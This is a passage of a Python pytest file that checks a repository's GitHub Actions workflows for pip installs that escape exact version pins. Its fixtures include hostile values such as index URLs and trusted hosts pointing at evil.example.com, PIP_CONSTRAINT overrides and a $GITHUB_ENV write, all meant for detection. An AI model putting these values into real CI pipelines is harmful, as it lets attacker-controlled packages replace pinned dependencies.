    """(where, variable name) for every PIP_* variable governed YAML sets."""
    found = []
    for path in governed_files(root):
        rel = path.relative_to(root).as_posix()
        doc = yaml.safe_load(path.read_text(encoding="utf-8"))
        if isinstance(doc, dict):
            found.extend((f"{rel}{key}", name)
                         for key, name in env_mappings(doc)
                         if name.startswith("PIP_"))
    for path, label, index, _name, body, shell, _workdir in parsed_run_steps(root):
        if "PIP_" not in body or not runs_a_command_line(shell):
            continue
        try:
            tokens = shell_tokens(split_heredocs(body)[0])
        except ValueError:
            continue  # reported by the step walk as unplaceable already
        where = f"{path.relative_to(root).as_posix()} {label} step {index}"
        for token in tokens:
            match = PIP_ENVIRONMENT_ASSIGNMENT.match(token)
            if match:
                found.append((where, match.group(1)))
    return found


PIP_ENVIRONMENT = pip_environment()


def test_no_governed_yaml_sets_a_pip_variable_that_can_change_a_version():
    """The option whitelist reads the command line, and pip does not stop
    there: it takes `PIP_<OPTION>` for every option it accepts. `PIP_CONSTRAINT`
    is `-c` by another name, and a constraints file beats requirements-dev.txt,
    so an install this file calls clean installs a version the file does not
    name. Both routes reach here — the `env:` key, which the stray-scalar walk
    cannot see because the variable is the KEY rather than the value, and a
    `NAME=value` in the shell, which the tokeniser was written to treat as
    harmless."""
    rejected = sorted(
        f"{where} sets `{name}`"
        for where, name in PIP_ENVIRONMENT
        if name not in VERSION_NEUTRAL_PIP_ENV
    )
    assert not rejected, (
        "\n".join(rejected)
        + "\n\npip reads `PIP_<OPTION>` for every option it has, so these are "
          "the options the whitelist rejects wearing another name: "
          "PIP_CONSTRAINT is `-c`, PIP_INDEX_URL is `-i`, and either one "
          "installs a version requirements-dev.txt does not name while the "
          "command line still reads `-r requirements-dev.txt`. Only the "
          "environment twins of options on VERSION_NEUTRAL_FLAGS and "
          "VERSION_NEUTRAL_VALUE_OPTIONS are allowed, and that set is derived "
          "from those tables rather than written out again."
    )


def scalars(node, path=""):
    """Every string scalar in a parsed document, with its key path.

    Knows nothing about jobs or steps on purpose — that is what makes it an
    independent reading of the same file.
    """
    if isinstance(node, dict):
        for key, value in node.items():
            yield from scalars(value, f"{path}.{key}")
    elif isinstance(node, list):
        for index, value in enumerate(node):
            yield from scalars(value, f"{path}[{index}]")
    elif isinstance(node, str):
        yield path or ".", node


def step_run_paths(doc):
    return {
        f"{prefix}[{index}].run"
        for _, prefix, steps, _defaults in step_containers(doc)
        for index, step in enumerate(steps or [])
        if isinstance(step, dict) and isinstance(step.get("run"), str)
    }


@pytest.mark.parametrize("path", governed_files(),
                         ids=lambda p: p.relative_to(REPO_ROOT).as_posix())
def test_no_pip_install_hides_where_the_parsed_walk_cannot_see_it(path):
    """The checks above read `jobs -> steps -> run`. A pip install anywhere
    else in the document — a `defaults:` block, an `env:` default, a `with:`
    argument to an action, a job key a future Actions feature adds — would be
    governed by nothing and pass in silence. This walks the whole tree instead
    and fails on any pip install outside a step body, naming the key path."""
    doc = yaml.safe_load(path.read_text(encoding="utf-8"))
    known = step_run_paths(doc)
    stray = sorted(
        key for key, text in scalars(doc)
        if key not in known and any(scan_shell_body(text, strict=False))
    )
    assert not stray, (
        f"{path.relative_to(REPO_ROOT).as_posix()} holds {len(stray)} "
        f"scalar(s) that read as a pip install outside any step's `run:`, so "
        f"none of the checks above apply to them: {stray}. Either move the "
        f"install into a step's `run:`, or teach step_containers() to reach "
        f"it — do not leave it ungoverned."
    )


def test_every_declared_requirement_is_pinned_exactly():
    """parse_requirements() asserts the shape of every line as it reads them;
    this is the test that makes those assertions run even on a day when no
    workflow names a package and the drift test returns early."""
    assert declared_requirements()


REJECTED_REQUIREMENT_LINES = [
    ("pytest-cov[toml]==7.0.0", "bare distribution name"),
    ('requests==2.32.3 ; python_version < "3.13"', "plain version"),
    ("requests>=2.32.3", "exact pin"),
    ("requests", "exact pin"),
    ("requests @ https://example.com/requests.whl", "exact pin"),
    ("-r other-requirements.txt", "exact pin"),
    ("requests==", "empty version"),
    ("pyyaml==6.0.3\nPyYAML==6.0.1", "pinned twice"),
    ("# nothing but a comment", "declares nothing"),
]


@pytest.mark.parametrize("text, expected", REJECTED_REQUIREMENT_LINES)
def test_a_requirement_line_that_is_not_one_exact_pin_is_rejected(text, expected):
    """The extras case is the one that used to pass: `pytest-cov[toml]` was
    read as the name and `7.0.0` satisfied the version check, so a line
    pulling in unnamed requirements was green."""
    with pytest.raises(AssertionError) as raised:
        parse_requirements(text, source="fixture")
    assert expected in str(raised.value)


def test_the_pins_a_requirements_file_may_hold_still_parse():
    assert parse_requirements(
        "# a comment\n\npyyaml==6.0.3  # trailing comment\n"
        "markdown-it-py==4.2.0\nPyYAML_x==1.0.0rc1\n"
    ) == {"pyyaml": "6.0.3", "markdown-it-py": "4.2.0", "pyyaml-x": "1.0.0rc1"}


# --- the recogniser's own tests -------------------------------------------
#
# The checks above are only as good as what the scanner hands them, and every
# case below is one an anchored, prefix-matching recogniser got wrong. They are
# unit tests over synthetic shell rather than over this repo's workflows, so
# they keep holding on a day when no workflow happens to be written that way.

WRAPPED_PIP_INSTALLS = [
    "sudo python3 -m pip install pyyaml==6.0.1",
    "env FOO=1 pip install pyyaml==6.0.1",
    "uv pip install pyyaml==6.0.1",
    "$PY -m pip install pyyaml==6.0.1",
    "python3 -m pip -q install pyyaml==6.0.1",
    "pip3.11 install pyyaml==6.0.1",
    "/usr/bin/pip install pyyaml==6.0.1",
    "FOO=1 BAR=2 pip3 install pyyaml==6.0.1",
    "xvfb-run --auto-servernum python -m pip install pyyaml==6.0.1",
    "set -e\ntrue && sudo -H pip install pyyaml==6.0.1",
]


@pytest.mark.parametrize("body", WRAPPED_PIP_INSTALLS)
def test_the_recogniser_sees_an_install_however_it_is_wrapped(body):
    """Each of these hid a drifted pin from the anchored recogniser this
    replaced, at exit 0 and with no test even generated for it."""
    found, unplaceable = scan_shell_body(body)
    assert not unplaceable, unplaceable
    assert len(found) == 1, found
    _, packages, _ = install_operands(found[0][1])
    assert packages == ["pyyaml==6.0.1"], found


NOT_PIP_INSTALLS = [
    "npm install left-pad",
    "apt-get install -y python3",
    "go install ./cmd/thing",
    'echo "pip install pyyaml==6.0.1"',
    "# pip install pyyaml==6.0.1\ntrue",
    "pip download pyyaml==6.0.1",
    "pip list --outdated",
    "set -uo pipefail\npip_ok=yes",
]


@pytest.mark.parametrize("body", NOT_PIP_INSTALLS)
def test_the_recogniser_reports_nothing_for_what_installs_no_package(body):
    """The other half: a recogniser that fails closed is only usable if the
    ordinary shell in these workflows does not trip it. A quoted string and a
    `#` comment are one token and no token respectively, which is why
    tokenising beats scanning lines for the words."""
    assert scan_shell_body(body) == ([], [])


UNPLACEABLE_COMMANDS = [
    "$PY -m $MODULE install pyyaml==6.0.1",
    "${PIP} install pyyaml==6.0.1",
    "pip $SUBCOMMAND pyyaml==6.0.1",
    "pip --log build.log install pyyaml==6.0.1",
]


@pytest.mark.parametrize("body", UNPLACEABLE_COMMANDS)
def test_a_command_that_might_be_an_install_is_reported_not_skipped(body):
    """Fail-closed. None of these can be read at test time as installing or
    not installing, so the scanner refuses to decide and
    test_no_workflow_command_that_might_be_a_pip_install_is_left_unplaced
    turns that refusal into a failure."""
    found, unplaceable = scan_shell_body(body)
    assert found == []
    assert len(unplaceable) == 1, unplaceable


def test_an_unquotable_shell_body_fails_rather_than_parsing_as_nothing():
    """shlex raises on an unbalanced quote. Returning no commands there would
    turn any body it cannot read into a silent pass."""
    found, unplaceable = scan_shell_body("pip install 'pyyaml==6.0.1")
    assert found == []
    assert len(unplaceable) == 1 and "tokenise" in unplaceable[0][1]


def test_a_continued_install_is_one_command():
    """account-skill-zips.yml writes its install across lines with a trailing
    backslash; the tokens either side of the break belong to one command."""
    found, unplaceable = scan_shell_body(
        "python3 -m pip install --quiet \\\n  -r requirements-dev.txt")
    assert not unplaceable
    assert [install_operands(args) for _, args in found] == [
        (["requirements-dev.txt"], [], [])]


VERSION_CHANGING_OPTIONS = [
    "python3 -m pip install -r requirements-dev.txt -c constraints.txt",
    "python3 -m pip install -r requirements-dev.txt --constraint=constraints.txt",
    "python3 -m pip install -r requirements-dev.txt -i https://evil.example.com/simple",
    "python3 -m pip install -r requirements-dev.txt --index-url https://evil.example.com/simple",
    "python3 -m pip install -r requirements-dev.txt --extra-index-url https://evil.example.com/simple",
    "python3 -m pip install -r requirements-dev.txt -f ./wheels",
    "python3 -m pip install -r requirements-dev.txt --pre",
    "python3 -m pip install -r requirements-dev.txt --no-deps",
    "python3 -m pip install -r requirements-dev.txt --trusted-host evil.example.com",
    "python3 -m pip install -r requirements-dev.txt --an-option-pip-grows-later",
]


@pytest.mark.parametrize("body", VERSION_CHANGING_OPTIONS)
def test_an_option_that_can_override_the_pins_is_rejected(body):
    """Every one of these reads requirements-dev.txt and can still install a
    version it does not name; the last is the whitelist's whole point, since
    no table written today knows what pip will grow."""
    found, unplaceable = scan_shell_body(body)
    assert not unplaceable and len(found) == 1, (found, unplaceable)
    _, _, rejected = install_operands(found[0][1])
    assert rejected, body


VERSION_NEUTRAL_INSTALLS = [
    "python3 -m pip install --quiet -r requirements-dev.txt",
    "python3 -m pip install -r requirements-dev.txt --no-cache-dir",
    "python3 -m pip install --progress-bar off -r requirements-dev.txt",
    "python3 -m pip install --progress-bar=off -r requirements-dev.txt",
    "python3 -m pip install --requirement=requirements-dev.txt",
    "python3 -m pip install -rrequirements-dev.txt",
]


@pytest.mark.parametrize("body", VERSION_NEUTRAL_INSTALLS)
def test_the_whitelist_still_admits_an_install_that_changes_no_version(body):
    """The whitelist has to leave the shapes these workflows use, and the ones
    a reviewer would reasonably reach for, able to pass — a check nothing can
    satisfy gets deleted rather than obeyed."""
    found, unplaceable = scan_shell_body(body)
    assert not unplaceable and len(found) == 1, (found, unplaceable)
    files, packages, rejected = install_operands(found[0][1])
    assert (files, packages, rejected) == (["requirements-dev.txt"], [], [])


COMPOSITE_ACTION_WITH_A_DRIFTED_PIN = """\
name: Set up
runs:
  using: composite
  steps:
    - shell: bash
      run: python3 -m pip install pyyaml==6.0.1
"""


def test_a_composite_action_is_governed_like_a_workflow_step(tmp_path):
    """.github/actions/**/action.yml runs shell in this repo's own jobs, so a
    pin can drift back in there. The walk used to read `jobs -> steps -> run`
    in .github/workflows/ only, and a composite action has neither the
    directory nor the `jobs` key."""
    action = tmp_path / ".github" / "actions" / "setup" / "action.yml"
    action.parent.mkdir(parents=True)
    action.write_text(COMPOSITE_ACTION_WITH_A_DRIFTED_PIN, encoding="utf-8")

    assert governed_files(tmp_path) == [action]
    found, unplaceable = scan_workflows(tmp_path)
    assert not unplaceable
    assert [(where, command) for where, command, _, _ in found] == [
        (".github/actions/setup/action.yml composite action step 0",
         "python3 -m pip install pyyaml==6.0.1")
    ]
    assert install_operands(found[0][2]) == ([], ["pyyaml==6.0.1"], [])


def test_the_second_pair_of_eyes_reaches_a_composite_action_too(tmp_path):
    """The stray-scalar walk has to know where a composite action's steps
    live, or every one of its `run:` bodies reads as a place the step walk
    never visited and the file fails on its own governed shell."""
    doc = yaml.safe_load(COMPOSITE_ACTION_WITH_A_DRIFTED_PIN)
    assert step_run_paths(doc) == {".runs.steps[0].run"}
    stray = [key for key, text in scalars(doc)
             if key not in step_run_paths(doc)
             and any(scan_shell_body(text, strict=False))]
    assert stray == []


WORKFLOW_WITH_A_PYTHON_SHELL_STEP = """\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - shell: python
        run: |
          import subprocess, sys
          subprocess.check_call(
              [sys.executable, "-m", "pip", "install", "pyyaml==6.0.1"])
"""

WORKFLOW_WITH_A_PYTHON_SHELL_DEFAULT = """\
name: CI
on: push
defaults:
  run:
    shell: python
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: |
          import subprocess, sys
          subprocess.check_call(
              [sys.executable, "-m", "pip", "install", "pyyaml==6.0.1"])
"""


def write_workflow(root, text, name="ci.yml"):
    path = root / ".github" / "workflows" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


@pytest.mark.parametrize("text", [WORKFLOW_WITH_A_PYTHON_SHELL_STEP,
                                  WORKFLOW_WITH_A_PYTHON_SHELL_DEFAULT],
                         ids=["on the step", "in defaults.run"])
def test_a_step_whose_shell_is_not_a_command_line_is_reported(tmp_path, text):
    """`shell: python` makes the `run:` body Python, and Python spells an
    install with no `pip` token and no `install` token — the tokeniser found
    neither, called the step QUIET, and a drifted pin installed at exit 0.
    Declared on the step or inherited from `defaults.run`, both reach here."""
    write_workflow(tmp_path, text)
    found, unplaceable = scan_workflows(tmp_path)
    assert found == []
    assert len(unplaceable) == 1, unplaceable
    assert "shell: python" in unplaceable[0][2]


HEREDOC_INSTALLS = [
    "python3 - <<'PY'\n"
    "import subprocess\n"
    "subprocess.check_call(['pip', 'install', 'pyyaml==6.0.1'])\n"
    "PY",
    "python3 - <<PY\nsubprocess.check_call(['pip', 'install', 'x'])\nPY",
    "\tpython3 - <<-PY\n\tpip install pyyaml==6.0.1\n\tPY",
]


@pytest.mark.parametrize("body", HEREDOC_INSTALLS)
def test_an_install_inside_a_heredoc_is_reported(body):
    """A heredoc body is stdin, not shell. Left in the token stream it parsed
    as ordinary words in a command holding no `pip` token, so `python3 -
    <<PY` with an install inside it was read as QUIET."""
    found, unplaceable = scan_shell_body(body)
    assert found == []
    assert len(unplaceable) == 1, unplaceable
    assert "heredoc" in unplaceable[0][1]


def test_a_heredoc_that_names_no_install_leaves_the_shell_around_it_readable():
    """account-skill-zips.yml's `pick` job pipes a Python program into
    `python3 -` from the same body that runs `pip install --quiet -r
    requirements-dev.txt`. Lifting the heredoc out must not take that install
    with it."""
    found, unplaceable = scan_shell_body(
        "python3 -m pip install -r requirements-dev.txt\n"
        "verdict=$(python3 - <<'PY'\n"
        "import yaml\n"
        "print(yaml.__version__)\n"
        "PY\n"
        ")"
    )
    assert not unplaceable, unplaceable
    assert [install_operands(args) for _, args in found] == [
        (["requirements-dev.txt"], [], [])]


WORKFLOW_WITH_A_WORKING_DIRECTORY = """\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: python3 -m pip install -r requirements-dev.txt
        working-directory: tools
"""

WORKFLOW_WITH_A_WORKING_DIRECTORY_DEFAULT = """\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: tools
    steps:
      - run: python3 -m pip install -r requirements-dev.txt
"""


@pytest.mark.parametrize("text", [WORKFLOW_WITH_A_WORKING_DIRECTORY,
                                  WORKFLOW_WITH_A_WORKING_DIRECTORY_DEFAULT],
                         ids=["on the step", "in defaults.run"])
def test_an_install_carries_the_directory_it_resolves_its_requirements_from(
        tmp_path, text):
    """`working-directory:` is a step key the shell tokeniser never sees, and
    the `-r` check used to resolve the path against this repo's root. A step
    at `tools/` reads tools/requirements-dev.txt, so a drifted pin in that
    file installed while the check said the declared file was being read."""
    write_workflow(tmp_path, text)
    found, unplaceable = scan_workflows(tmp_path)
    assert not unplaceable, unplaceable
    assert [workdir for _, _, _, workdir in found] == ["tools"]


def test_the_requirements_path_is_resolved_from_the_step_not_the_repo_root():
    """The two directions of the same resolution: at the root `-r
    requirements-dev.txt` IS the declared file, and one directory down it is a
    different file with the same name."""
    assert requirements_path_read_by(".", "requirements-dev.txt") == REQUIREMENTS
    assert requirements_path_read_by(
        "tools", "requirements-dev.txt") != REQUIREMENTS
    assert requirements_path_read_by(
        "tools", "../requirements-dev.txt") == REQUIREMENTS


WORKFLOW_WITH_AN_UNRESOLVABLE_WORKING_DIRECTORY = """\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: python3 -m pip install -r requirements-dev.txt
        working-directory: ${{ github.workspace }}/tools
"""


def test_an_install_under_a_working_directory_decided_at_job_time_is_reported(
        tmp_path):
    """Fail-closed on the resolution too: a working directory that is an
    expression is not a directory this file can resolve `-r` against, so it
    refuses rather than guessing the root."""
    write_workflow(tmp_path, WORKFLOW_WITH_AN_UNRESOLVABLE_WORKING_DIRECTORY)
    _, unplaceable = scan_workflows(tmp_path)
    assert len(unplaceable) == 1, unplaceable
    assert "working-directory" in unplaceable[0][2]


CD_BEFORE_AN_INSTALL = [
    "cd tools && python3 -m pip install -r requirements-dev.txt",
    "cd tools\npython3 -m pip install -r requirements-dev.txt",
    "python3 -m pip install -r requirements-dev.txt\ncd tools",
    "pushd tools\npython3 -m pip install -r requirements-dev.txt\npopd",
]


@pytest.mark.parametrize("body", CD_BEFORE_AN_INSTALL)
def test_a_body_that_changes_directory_around_an_install_is_reported(body):
    """The plain-shell twin of `working-directory:`, and the one no YAML key
    records. `cd tools && pip install -r requirements-dev.txt` reads
    tools/requirements-dev.txt, and the scanner reported it as a clean install
    of the declared file. The last two cases are here because a token walk
    cannot order a `cd` against an install: both are reported."""
    found, unplaceable = scan_shell_body(body)
    assert len(found) == 1, found
    assert len(unplaceable) == 1, unplaceable
    assert "changes directory" in unplaceable[0][1]


def test_a_body_that_changes_directory_and_installs_nothing_stays_quiet():
    """`cd` is ordinary in these workflows. It is only a finding next to an
    install, or the rule would red every step that moves around a checkout."""
    assert scan_shell_body("cd tools && npm install left-pad") == ([], [])


PIP_ENVIRONMENT_ROUTES = [
    ("""\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: python3 -m pip install -r requirements-dev.txt
        env:
          PIP_CONSTRAINT: drift.txt
""", "PIP_CONSTRAINT", "a step `env:`"),
    ("""\
name: CI
on: push
env:
  PIP_INDEX_URL: https://evil.example.com/simple
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: python3 -m pip install -r requirements-dev.txt
""", "PIP_INDEX_URL", "a workflow `env:`"),
    ("""\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    env:
      PIP_EXTRA_INDEX_URL: https://evil.example.com/simple
    steps:
      - run: python3 -m pip install -r requirements-dev.txt
""", "PIP_EXTRA_INDEX_URL", "a job `env:`"),
    ("""\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: PIP_CONSTRAINT=drift.txt python3 -m pip install -r requirements-dev.txt
""", "PIP_CONSTRAINT", "an inline assignment"),
    ("""\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: |
          export PIP_PRE=1
          python3 -m pip install -r requirements-dev.txt
""", "PIP_PRE", "an export"),
    ("""\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: echo "PIP_CONSTRAINT=drift.txt" >> "$GITHUB_ENV"
""", "PIP_CONSTRAINT", "a write to $GITHUB_ENV"),
]


@pytest.mark.parametrize(
    "text, variable, route", PIP_ENVIRONMENT_ROUTES,
    ids=[route for _, _, route in PIP_ENVIRONMENT_ROUTES])
def test_a_pip_variable_that_can_change_a_version_is_found(
        tmp_path, text, variable, route):
    """Every one of these installs a version requirements-dev.txt does not
    name while the command line still reads `-r requirements-dev.txt`. The
    `env:` routes are invisible to the tokeniser and to the stray-scalar walk
    — that walk reads scalar VALUES, and `drift.txt` says nothing — and the
    inline one is invisible because `NAME=value` is deliberately skipped as
    "an environment assignment, not the program being run"."""
    write_workflow(tmp_path, text)
    assert [name for _, name in pip_environment(tmp_path)] == [variable]
    assert variable not in VERSION_NEUTRAL_PIP_ENV


NEUTRAL_PIP_ENVIRONMENT = """\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: PIP_NO_CACHE_DIR=1 python3 -m pip install -r requirements-dev.txt
        env:
          PIP_PROGRESS_BAR: 'off'
          PIP_DISABLE_PIP_VERSION_CHECK: '1'
"""


def test_a_pip_variable_that_cannot_change_a_version_is_allowed(tmp_path):
    """The allowed set is derived from the option whitelist, so the twins of
    options already admitted on the command line are admitted here. A rule
    that rejected every PIP_* variable would reject the ones these workflows
    could reasonably use, and a check nothing can satisfy gets deleted."""
    write_workflow(tmp_path, NEUTRAL_PIP_ENVIRONMENT)
    names = {name for _, name in pip_environment(tmp_path)}
    assert names == {"PIP_NO_CACHE_DIR", "PIP_PROGRESS_BAR",
                     "PIP_DISABLE_PIP_VERSION_CHECK"}
    assert names <= VERSION_NEUTRAL_PIP_ENV


def test_the_allowed_pip_variables_are_the_whitelisted_options_renamed():
    """The two tables cannot drift, because there is only one table: an
    option's environment twin is derived from its name. `--constraint` is not
    on the whitelist, so `PIP_CONSTRAINT` is not allowed either — and
    `--requirement` is read rather than whitelisted, so `PIP_REQUIREMENT`, a
    second requirements file by another name, is not allowed."""
    assert pip_environment_name("--no-cache-dir") == "PIP_NO_CACHE_DIR"
    assert "PIP_NO_CACHE_DIR" in VERSION_NEUTRAL_PIP_ENV
    for option in ("--constraint", "--index-url", "--extra-index-url",
                   "--find-links", "--pre", "--requirement",
                   "--no-deps", "--trusted-host"):
        assert option not in VERSION_NEUTRAL_FLAGS | VERSION_NEUTRAL_VALUE_OPTIONS
        assert pip_environment_name(option) not in VERSION_NEUTRAL_PIP_ENV


def test_a_shell_name_that_merely_starts_like_a_pip_variable_is_not_one(
        tmp_path):
    """account-skill-zips.yml sets `pip_ok=yes`. Environment variables are
    case-sensitive and pip reads the uppercase form, so the lowercase flag is
    not a pip setting and must not be reported as one."""
    write_workflow(tmp_path, """\
name: CI
on: push
jobs:
  pytest:
    runs-on: ubuntu-latest
    steps:
      - run: |
          pip_ok=yes
          python3 -m pip install -r requirements-dev.txt || pip_ok=no
""")
    assert pip_environment(tmp_path) == []


PROSE_A_STEP_NAME_MAY_HOLD = [
    "Install the runner's Python dependencies",
    "Don't reinstall anything",
    "Verify the runner's pip cache",
    "Install pip packages",
    "Read the published account audit's verdict",
]


@pytest.mark.parametrize("text", PROSE_A_STEP_NAME_MAY_HOLD)
def test_prose_outside_a_run_body_is_not_read_as_a_command(text):
    """Renaming a step must not red CI. Each of these is a `name:`, gets past
    the pip/install pre-filter, and then reads as broken shell: the first
    three raise on the apostrophe, and the fourth tokenises to a `pip` token
    whose subcommand is the word `packages`. The last is this repo's own step
    name, which survived only because it happens to contain neither `pip` nor
    `install`. A `run:` body is still read strictly — that is where shell
    lives — so nothing hides behind this."""
    assert scan_shell_body(text, strict=False) == ([], [])


def test_a_run_body_is_still_read_strictly():
    """The negative control for the case above: the same two shapes are
    findings when they are shell this repo executes, and the step walk reads
    every `run:` body that way."""
    assert scan_shell_body("pip install 'pyyaml==6.0.1") != ([], [])
    assert scan_shell_body("pip $SUBCOMMAND pyyaml==6.0.1") != ([], [])


def test_a_real_install_outside_a_run_body_is_still_a_stray():
    """What the stray walk is for. Dropping prose must not drop an install
    that turns up in an `env:` default or a `with:` argument, where nothing
    else here would look at it."""
    for text in ("python3 -m pip install pyyaml==6.0.1",
                 "${PIP} install pyyaml==6.0.1"):
        assert any(scan_shell_body(text, strict=False)), text


MORE_WAYS_TO_HIDE_AN_INSTALL = [
    ("python3 -mpip install pyyaml==6.0.1", "install"),
    ("python -m'pip' install pyyaml==6.0.1", "install"),
    ("sudo -u root $PIP install pyyaml==6.0.1", "unplaceable"),
    ("$(which pip) install pyyaml==6.0.1", "unplaceable"),
    ("python3 -c \"import pip; pip.main(['install', 'pyyaml==6.0.1'])\"",
     "unplaceable"),
    ('bash -c "pip install pyyaml==6.0.1"', "unplaceable"),
    ("sh -c 'pip3 install pyyaml==6.0.1'", "unplaceable"),
]


@pytest.mark.parametrize("body, expected", MORE_WAYS_TO_HIDE_AN_INSTALL)
def test_an_install_the_token_walk_could_still_have_missed(body, expected):
    """Found by attacking this file's own recogniser after it replaced the
    anchored one. `-mpip` is valid Python and leaves no `pip` token; a wrapper
    read from a variable leaves no resolvable program to check; and `python -c`
    hands the whole install to the interpreter as one quoted token, where no
    shell parser can see it."""
    found, unplaceable = scan_shell_body(body)
    if expected == "install":
        assert not unplaceable and len(found) == 1, (found, unplaceable)
        assert install_operands(found[0][1])[1] == ["pyyaml==6.0.1"]
    else:
        assert found == [] and len(unplaceable) == 1, (found, unplaceable)


ORDINARY_SHELL_THAT_MUST_STAY_QUIET = [
    "env PATH=$PATH npm install left-pad",
    "npm install --prefix $DIR left-pad",
    "drift=$(PYTHONPATH=scripts python3 -c 'from x import Y; print(Y)')",
    "python3 -m pytest scripts/ -q",
    "bash -c 'set -o pipefail; make'",
    'echo "a pipeline, not a pip install"',
]


@pytest.mark.parametrize("body", ORDINARY_SHELL_THAT_MUST_STAY_QUIET)
def test_the_extra_fail_closed_rules_do_not_fire_on_ordinary_shell(body):
    """Fail-closed only pays if it stays quiet on what these workflows do.
    The third is account-skill-zips.yml's own shape, reduced."""
    assert scan_shell_body(body) == ([], [])
